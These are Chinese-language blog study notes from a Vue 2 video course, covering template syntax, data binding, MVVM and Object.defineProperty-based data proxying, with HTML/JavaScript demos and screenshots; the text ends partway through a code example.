---
title: vue
date: 2022-10-17 21:48:48
tags:
- Vue
- 尚硅谷
- 张天禹
categories: 
- 视频学习笔记
index_img: /images/vue.png
---

# 第 1 章：Vue 核心

~~~
{% meting "5410361834" "netease" "playlist" "autoplay"  "mini:true" "order:random" %}
~~~



## 1.1. Vue 简介 

### 1.1.1. 官网 

1. 英文官网: https://vuejs.org/ 
2. 中文官网: https://v2.cn.vuejs.org/

### 1.1.2. 介绍与描述

- 动态 **构建用户界面** 的 **渐进式**  **JavaScript 框架** 

​		构建用户界面：将数据放到页面的合适位置

​		渐进式 ：Vue可以自底向上逐层的应用 即：搭建简单应用时，只需一个轻量小巧的核心库。如果需要搭建更为复杂的应用，则可以通过引入各种各样的Vue插件实现。

- 作者: 尤雨溪

历史版本：

---

![image-20221012232949479](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210122329796.png)

---

> 先有Angla 再有React 再有Vue





### 1.1.3. Vue 的特点

1、采用组件模式，提高代码复用率，目让代码更好维护

---

![image-20221012233432132](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210122334800.png)

---

> Vue中会有一个文件 以.vue结尾，里面包含三部分：结构 样式 行为





2、声明式编码，让编码人员无需直接操作DOM，拟提高开发效率

完成一个需求：

---

![image-20221012233714933](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210122337027.png)

----

**命令式编码**

~~~javascript
let htmlStr = '';
person.forEach(p=>{
    htmlStr+= '<li>${p.id} - ${p.name} -${p.age}</li>'
}); 
let list = document.getElementById('list');
//亲自操作DOM元素
list.innerHTML =htmlStr;
~~~





**声明式编码**

~~~js
<ul id='list'>
    <li v-for="p in person">
        {{p.id}} - {{p.name}} - {{p.age}}
    </li>
</ui>
~~~





3、使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点

---

![image-20221012234852942](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161034417.png)

---





---

![image-20221012235125848](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210122351619.png)

---





---

![image-20221012235720740](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210122357399.png)

---

> 通过使用Diff算法对比两个虚拟DOM的不同，将不同的DOM元素放到真实DOM上，原有的DOM节点不变





### 1.1.4 学习Vue之前要掌握的JavaScript基础知识？

- ES6语法规范
- ES6模块化
- 包管理器
- 原型、原型链
- 数组常用方法
- axios

- promise

> 不会也不要慌，后面会有补充说明







### 1.1.5. Vue 周边库 

1. vue-cli: vue 脚手架 
2. vue-resource 请求
3. axios 请求
4. vue-router: 路由
5. vuex: 状态管理 
6. element-ui: 基于 vue 的 UI 组件库(PC 端) …

---

![image-20221013203113631](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132031261.png)

---





### 1.1.6. 与其它 JS 框架的关联 

1. 借鉴 Angular 的模板和数据绑定技术 
2. 借鉴 React 的组件化和虚拟 DOM





## 1.2. 初识 Vue



项目目录：

---

![image-20221013204615253](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132046521.png)

---

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<script type="text/javascript" src="../js/vue.js"></script>

<body>
    
</body>
</html>
~~~



---

![image-20221013204902453](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132049640.png)

---





打开 开发者模式

---

![image-20221013204553773](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132046923.png)

----





插件地址如下：

> https://github.com/vuejs/vue-devtools





---

![image-20221013205223716](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132052181.png)

---





---

![image-20221013205320320](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132053242.png)

----





---

![image-20221013205657492](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132057711.png)

---



---

![image-20221013205818270](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132058428.png)

----



阻止 vue 在启动时生成生产提示：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<script type="text/javascript" src="../js/vue.js"></script>

<body>
    <script type="text/javascript">
        Vue.config.productionTip=false;
    </script>
</body>
</html>
~~~





---

![image-20221013211328984](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132113572.png)

----





---

![image-20221013211401949](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132114285.png)

----

> 在VSCode中 下载Live Server插件 默认会在本机开启一个服务器，端口为5500





---

![image-20221013211734438](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132117566.png)

----

> 随便给一个图标，刷新页面



---

![image-20221013211812641](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132118038.png)

---



一个小Demo：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<script type="text/javascript" src="../js/vue.js"></script>

<body>
    <div id="root">
        hello {{name}}
    </div>
    <script type="text/javascript">
        //对vue的全局变量做出修改
        Vue.config.productionTip=false;

        const x=new Vue({
                el:'#root' ,//'e1用于指定当前Vue实例为哪个容器服务，值通常为css字符选择器
                //也可以 为 el:document.getElementById('root') 这是傻狗写法

                data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象
                    name:"fgcy"
                } 
        });
        // {}  是一个配置对象，配置对象中的key是不能改变的，值的数据类型也是固定的
    </script>
</body>
</html>
~~~







小结：

1、想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
2、root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
3、root容器里的代码被称为【Vue模板】,有两个作用 一是为vue实例提供模板，二是展示vue实例的工作成果





一些注意点：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<script type="text/javascript" src="../js/vue.js"></script>

<body>
    <div id="root1">
         {{address}},{{name}}
    </div>
    <div id="root2">
        {{address}},{{name}}
   </div>

    <script type="text/javascript">
        //对vue的全局变量做出修改
        Vue.config.productionTip=false;
        new Vue({
                el:'#root1' ,
                data:{ 
                    name:"fgcy",
                    address:"深圳"
                }       
        });

        new Vue({
                el:'#root2' ,
                data:{ 
                    name:"fgcy-333",
                    address:"日本"
                }       
        });

    </script>
</body>
</html>
~~~

---

![image-20221013215040488](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132150553.png)

---

> 一个vue实例只能对应一个容器
>
> 一个容器也只能对应一个vue实例
>
> 其他情况，报错



插值语法内部的代码必须写成 **js的表达式**

注意区分：js表达式 和js代码（语句）

1. 表达式：一个表达式会 **产生一个值**，可以放在任何一个需要值的地方
   （1）a
   （2）a+b
   （3）demo(111)
   （4）X === y？'a'：'b'
2. js代码（语句）
   （1）if(){}
   （2）for(){}









验证改变vue实例中的值可以修改容器中的值：

----

![image-20221013220610165](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132206723.png)

----





---

![image-20221013220652542](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132206459.png)

---





~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<script type="text/javascript" src="../js/vue.js"></script>

<body>
    <div id="root1">
         {{address}},{{name.toUpperCase()}}，{{Date.now()}}
    </div>

    <script type="text/javascript">
        //对vue的全局变量做出修改
        Vue.config.productionTip=false;
        new Vue({
                el:'#root1' ,
                data:{ 
                    name:"fgcy",
                    address:"深圳"
                }       
        });
    </script>
</body>
</html>
~~~

---

![image-20221013220853725](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132208766.png)

---



再小结：

1. 想让vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
2. root容器里的代码依然符合html规范，只不过混入了一些特殊的 Vue语法
3. root容器里的代码被称为【Vue模板】：
4. Vue实例和容器是一 一对应的；
5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用，
6. {{message}} 中的 `xxx `要写 js表达式 ，且 `xxx` 可以自动读取到data中的所有属性
7. 一旦data中的数据发生改变，那么页面中用到该效据的地方也会自动更新









## 1.3. 模板语法

**模板的理解:**

html 中包含了一些 JS 语法代码，语法分为两种，分别为： 

1. 插值语法（双大括号表达式） 
2. 指令（以 v-开头)



### **插值语法** 

1. 功能: 用于解析标签体内容 
2. 语法: {{xxx}} ，xxxx 会作为 js

**Demo:**

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>插值语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
         <h1>插值语法</h1>
         <h3>你好,{{name}}</h3>
         <hr/>
         <h1>指令语法</h1>
         <a href={{url}}>redirect</a>
    </div>
    <script type="text/javascript">
        new Vue({
            el:"#root",
            data:{
                name:"java",
                url:"https://fgcy-333.github.io"
            }
        });
    </script>
</body>
</html>
~~~





---

![image-20221013222456305](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132224872.png)

---







### **指令语法** 

1. 功能: 解析**标签属性**、解析**标签体**内容、**绑定事件** 
1. 举例：v-bind:href = 'xxxx' ，xxxx 会作为 js 表达式被解析 
1. 说明：Vue 中有有很多的指令，此处只是用 v-bind 举个例子



---

![image-20221013222306055](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142349901.png)

---

> 这种语法之前是支持的，现在不支持了。
>
> 官方要求使用指令语法来代替插值语法





修改：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>插值语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
         <h1>插值语法</h1>
         <h3>你好,{{name}}</h3>
         <hr/>
         <h1>指令语法</h1>
         <!-- <a href={{url}}>redirect</a>     错误写法-->
         <!--  这样写后会将双引号中的字符串当作 js表达式 执行-->
         <a v-bind:href="url">redirect</a>
    </div>
    <script type="text/javascript">
        new Vue({
            el:"#root",
            data:{
                name:"java",
                url:"https://fgcy-333.github.io"
            }
        });
    </script>
</body>
</html>
~~~



---

![image-20221013223024032](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132230155.png)

---



其他属性能否使用 `v-bind:`

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>插值语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
         <h1>插值语法</h1>
         <h3>你好,{{name}}</h3>
         <hr/>
         <h1>指令语法</h1>
         <!-- <a href={{url}}>redirect</a>     错误写法-->
         <!--  这样写后会将双引号中的字符串当作 js表达式 执行-->
         <a v-bind:href="url" v-bind:aaa="url" v-bind:bbb="uri">redirect</a>
    </div>

    <script type="text/javascript">
            new Vue({
                el:"#root",
                data:{
                    name:"java",
                    url:"https://fgcy-333.github.io"
                }
            });
    </script>
</body>
</html>
~~~

> 是可以的

如下图：

---

![image-20221013223259086](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132233257.png)

----



但是会报一个错：

---

![image-20221013223342768](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132233763.png)

---

> 没有定义`uri`这个属性



注意：

`v-bind:` 可以简写为 `:`

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>插值语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
         <h1>插值语法</h1>
         <h3>你好,{{name}}</h3>
         <hr/>
         <h1>指令语法</h1>
         <!-- <a href={{url}}>redirect</a>     错误写法-->
         <!--  这样写后会将双引号中的字符串当作 js表达式 执行-->
         <a v-bind:href="url" v-bind:aaa="url" v-bind:bbb="uri">redirect</a>
         <a :href="url" >试试冒号</a>
    </div>

    <script type="text/javascript">
            new Vue({
                el:"#root",
                data:{
                    name:"java",
                    url:"https://fgcy-333.github.io"
                }
            });
    </script>
</body>
</html>
~~~



---

![image-20221013223633415](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132236988.png)

---





~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>插值语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
         <h1>插值语法</h1>
         <h3>你好,{{name}}</h3>
         <hr/>

         <h1>指令语法</h1>
         <!-- <a href={{url}}>redirect</a>     错误写法-->
         <!--  这样写后会将双引号中的字符串当作 js表达式 执行-->
         <a v-bind:href="school.url" v-bind:aaa="url" >{{school.name}}</a>
    </div>
    <script type="text/javascript">
new Vue({
    el:"#root",
    data:{
        name:"",
        school:{
            name:"风格差异的个人博客",
            url:"https://fgcy-333.github.io"
       }
    }
});
    </script>
</body>
</html>
~~~

---

![image-20221013224802937](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210132248474.png)

---

**小结：**

vue模板语法有2大类：

1. 插值语法：功能：用干解析标签体内容
   写法：{{xxx}}，`xxx` 是js表达式，且可以直接读取到data中的所有属性。
2. 指令语法：功能：用于解析标签包括：标签属性、标签体内容、绑定事件
   举例：v-bind；href="xxx”或 简写为：href="xxx"，xxx同样要写is表达式且可以直按读取到data中的所有属性。
   备注：Vue中有很多的指令，且形式都是：v-?????? ，此处我们只是拿v-bind举个例子.





## 单向数据绑定：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>单向数据绑定</title>
</head>
<body>

    <script type="text/javascript" src="../js/vue.js"></script>
    
    <div id="root">
        <input type="text" :value="name">
    </div>

    <script type="text/javascript">
        new Vue({
            el:"#root",
            data:{
                name:"尚硅谷"
            }
        });
    </script>
</body>
</html>
~~~

--------

![image-20221014223540873](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142235323.png)

---

修改vue实例中的值以，动态修改容器中的值。

反之：修改容器中的值不会影响vue实例的值



~~~js
> document.querySelector('input').value;
> '尚硅谷1234'
~~~







## 双向数据绑定：

----

![image-20221014224549552](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142246891.png)

---



不适合`v-model`的 标签元素

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>数据绑定</title>
</head>
<body>

    <script type="text/javascript" src="../js/vue.js"></script>
    
    <div id="root">
        单向数据绑定<input type="text" :value="name"><br>
        双向数据绑定<input type="text" v-model:value="name"><br>

        <!-- <如下代码是错误的，因为v-mode1只能应用在表单类元素（输入类元素）上 -->
        <h2 v-model:x="name">你丫丫的</h2>
    </div>

    <script type="text/javascript">
        new Vue({
            el:"#root",
            data:{
                name:"尚硅谷"
            }
        });
    </script>
</body>
</html>
~~~



----

![image-20221014225004504](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142250407.png)

----

~~~error
vue.js:634 [Vue warn]: Error compiling template:

<h2 v-model="name">: v-model is not supported on this element type. If you are working with contenteditable, it's recommended to wrap a library dedicated for that purpose inside a custom component.

1  |  <div id="root">
   |  ^^^^^^^^^^^^^^^
2  |          单向数据绑定<input type="text" :value="name"><br>
   |  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3  |          双向数据绑定<input type="text" v-model:value="name"><br>
   |  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4  |  
   |  
5  |          <!-- <如下代码是错误的，因为v-mode1只能应用在表单类元素（输入类元素）上 -->
   |  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6  |          <h2 v-model:x="name">你丫丫的</h2>
   |  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7  |      </div>
   |  ^^^^^^^^^^

(found in <Root>)
~~~



`v-model`的简写模式：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>数据绑定</title>
</head>
<body>
    <script type="text/javascript" src="../js/vue.js"></script>
    <div id="root">
        <!-- 普通写法 -->
        <!-- 
        单向数据绑定<input type="text" v-bind:value="name"><br>
        双向数据绑定<input type="text" v-model:value="name"><br>
         -->

         <!-- 简写 -->
        单向数据绑定<input type="text" :value="name"><br>
        双向数据绑定<input type="text" v-model="name"><br>

    </div>

    <script type="text/javascript">
        new Vue({
            el:"#root",
            data:{
                name:"尚硅谷"
            }
        });
    </script>
</body>
</html>
~~~

**小结：**

Vue中有2种数据绑定的方式：

1. 单向绑定（v-bind）：数据只能从data流向页面
2. 双向绑定（v-model）：数据不仅能从data流向页面，还可以从页面流向data。
3. 双向绑定一般都应用在表单类元素上（如：input、select等）
4. `v-model:value` 可以简写为  `v-model：`因为` v-model` 默认收集的就是 `value ` 值







## 配置用户代码片段：

---

![image-20221014230640034](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142306863.png)

---



---

![image-20221014232301094](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142323072.png)

---



~~~js
{
	"v1": {
		"prefix": "v1",
		"body": [
"   <script src='../js/vue.js'></script>",
		"<div id='root'>",
		"{{name}}",
		"</div>",
			"<script type='text/javascript'>",
			"Vue.config.productionTip = false",
			"new Vue({",
			" el:'#root' ,",
			" data:{",
			"  name:'aaaa'",
			"     }",
			" });",
			"    </script>"
		],
		"description": "快速生成vue实例代码"
	}
}
~~~







## el有2种写法

（1）new Vue时候配置el属性。
（2）先创建Vue实例，随后再通过 `vm.$mount（'$root'） `指定el的值，

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
   <script src='../js/vue.js'></script>

    <div id='root'>
            {{name}}
    </div>

<script type='text/javascript'>
    Vue.config.productionTip = false

   const x= new Vue({
        // el:'#root', //不通过这种方式绑定vue实例与容器了
    
        data:{
            name:'aaaa'
        }
    });
    console.log(x);//输出vue实例
    </script>
</html>
~~~

![image-20221014232110608](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142321176.png)

---



---

![image-20221014232756744](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210142327915.png)

---

> 查看vue实例的原型缔造者





因而有了第二种挂载数据的方法：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
   <script src='../js/vue.js'></script>

    <div id='root'>
            {{name}}
    </div>

<script type='text/javascript'>
    Vue.config.productionTip = false;

   const x= new Vue({
    // 挂载vue实例的第一种方法
        // el:'#root', //不通过这种方式绑定vue实例与容器了
        data:{
            name:'aaaa'
        }
    });
    console.log(x);//输出vue实例

    //第二种挂载vue实例的方法
    //第二种更灵活
    // x.$mount('#root');

    //两秒后，绑定vue实例与容器
    setTimeout(()=>{
        x.$mount('#root');
    },2000)
    </script>
</html>
~~~







## data的两种写法：

1. 对象式
2. 函数式

如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错

一个重要的原则：由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是vue实例了，而是window对象

目前学了一个：`data()`

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
   <script src='../js/vue.js'></script>

    <div id='root'>
            {{name}}
    </div>

<script type='text/javascript'>
    Vue.config.productionTip = false;
new Vue({
    el:"#root",
    //第一种写法：对象式
    // data:{
    //     name:"aaa"
    // }

    //第二种写法：函数式：
    /*
        注意这里不能写成箭头函数，因为箭头函数没有自己的this对象，只能往外找，所以是window对象
    */
   
    //普通写法
    // data:function(){
    //     console.log('@@@',this);//这里的this是vue实例
    //     return {
    //         name:"dddd"
    //     }
    // }


    // 简写
        data(){
        console.log('@@@',this);//这里的this是vue实例
        return {
            name:"dddd"
        }
    }

});
    </script>
</html>
~~~





## 1.4. MVVM 模型 

1. M：模型(Model) ：对应 data 中的数据 
1. V：视图(View) ：模板 
1. VM：视图模型(ViewModel) ： Vue 实例对象

---

![image-20221015000220839](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150002492.png)

---



通过代码理解 `MVVM 模型`

---

![image-20221015000638554](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150006600.png)

---

所以vue实例对象 一般用 `vm` 命名





观察一下 M 与 MV的关系：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
   <script src='../js/vue.js'></script>

<div id='root'>
  {{name}}
</div>

<script type='text/javascript'>
  Vue.config.productionTip = false
  const vm=new Vue({
    el:'#root' ,
    data:{
        name:'aaaa'
        }
 });

console.log(vm);

</script>
</body>
</html>
~~~

---

![image-20221015001349047](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150013394.png)

---

> 发现M中的数据通过 某种方式 放到了VM上，以属性的形式出现



并且需要注意的是，vue实例身上所有的属性 及 vue原型上所有属件，可以在Vue模板中都可以直接使用

----

![image-20221015001925755](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150019351.png)

---

**小结：**

MVVM模型

- M: 模型（Model）：data中的

- V:数据视图（View）：模板代码

- VM：视图模型（ViewModel）：Vue实例

观察发现：

1. data中所有的属性，最后都出现在了vm身上
2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用







## 数据代理



### 回顾 Object.definePropertity 方法

该方法底层与 Vue的 数据劫持 数据代理 还有 计算属性相关



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script type="text/javascript">
        let person={
            name:"fgcy",
            set:"femal"
        }

        Object.defineProperty(person,'age',{
                value:15
        });
        console.log(person);
    </script>
</body>
</html>
~~~

---

![image-20221015090245242](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150903459.png)

----





默认情况下使用 Object.defineProperty()添加的属性是不可枚举的：

---

![image-20221015090818516](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150908647.png)

---



通过修改配置项使得Object.defineProperty()添加的属性是可枚举的：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script type="text/javascript">
        let person={
            name:"fgcy",
            set:"femal"
        }

        Object.defineProperty(person,'age',{
                value:15,
                //添加配置项 enumerable
                enumerable:true //控制该属性是否可以被枚举，默认不可以
        });
        console.log(person);
    </script>
</body>
</html>
~~~

还有两个配置项：

~~~js
writable:true， //控制属性是否可以被修改，默认值是false 
configurable:true //控制属性是杏可以被删除，默认值是false
~~~



再带出一个高级一点的配置项（与vue底层原理相关）

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script type="text/javascript">

        let number=10;

        let person={
            name:"fgcy",
            set:"femal"
        }
        Object.defineProperty(person,'age',{
            get:function(){
                return number
            }
        });

        console.log(person);


    </script>
</body>
</html>
~~~

---

![image-20221015092410985](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150924740.png)

---



此时改变 number的值 ，对象person age的值也可以发生改变：

---

![image-20221015092736906](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150928454.png)

---











~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script type="text/javascript">
        let number=10;
        let person={
            name:"fgcy",
            set:"femal"
        }
        Object.defineProperty(person,'age',{
            get(){
                return number
            },

            //当有人修改person的age属性时，set函数（settem）就会被调用，且会收到修改的具体值
            set(value){
                    console.log('有人修改了person的age值，想要改为',value);
                    //通过修改number的值可以实现这个功能
                    //原因：读取person的age属性时 会去读取getter 而getter返回的是number的值
                    number=value;
            }
        });
        console.log(person);
    </script>
</body>
</html>
~~~



---

![image-20221015093638859](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150936375.png)

---





### 理解数据代理：

通过一个对象代理对另一个对象中属性的操作（读/写）

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script type="text/javascript">
            let obj1={
                x:100
            }

            let obj2={
                y:1000
            }

            Object.defineProperty(obj2,'x',{
                get(){
                    return obj1.x
                },
                //读谁就改谁
                set(value){
                    obj.x=value
                }
            })
        </script>
</body>
</html>
~~~



---

![image-20221015094817892](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210150948413.png)

---







vue中的数据代理：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     School: {{name}} <br>
     Address: {{address}}
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      const vm=new Vue({
       el:'#root' ,
       data:{
           name:'嘎腰子学院',
           address:'深圳湾一号'
         }
     });
     console.log(vm);
    </script>
</body>
</html>
~~~



---

![image-20221015095525900](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161035166.png)

---

验证修改DOM元素的值 会改变data 的值：

​	

先证明vm身上的 _data属性 就是 就是书写vue实例时，写的data对象

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     School: {{name}} <br>
     Address: {{address}}
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

      let data={
           name:'嘎腰子学院',
           address:'深圳湾一号'
         }

      const vm=new Vue({
        el:'#root' ,
        data
     });
     //vue实例上没有data属性 但有_data属性 想要验证_data 是否为 data对象
     //如果 满足 此关系 则可以说明 data === vm._data === 配置项的data
     console.log(vm);
    </script>
</body>
</html>
~~~

----

![image-20221015100644847](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151006968.png)

----

> _data 是由data对象加工后得到的 地址一样









修改dom元素，看看 `_data ` 中的元素数据有无发生改变:

---

![image-20221015101532720](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151015064.png)

---



到这一步还没有到数据代理：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
